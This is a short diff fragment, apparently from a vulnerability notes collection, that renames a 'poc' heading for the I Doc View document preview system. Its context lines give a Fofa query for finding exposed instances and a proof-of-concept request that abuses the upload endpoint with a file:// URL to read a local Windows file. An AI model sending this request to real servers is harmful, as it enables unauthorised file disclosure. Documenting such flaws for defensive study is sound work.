@@ -9,7 +9,7 @@ Fofa语法：
 title="I Doc View"
 ```
 
-## poc
+## POC
 ```
 http://xxxxxx/doc/upload?token=testtoken&url=file:///C:/windows/win.ini&name=test.txt
 ```
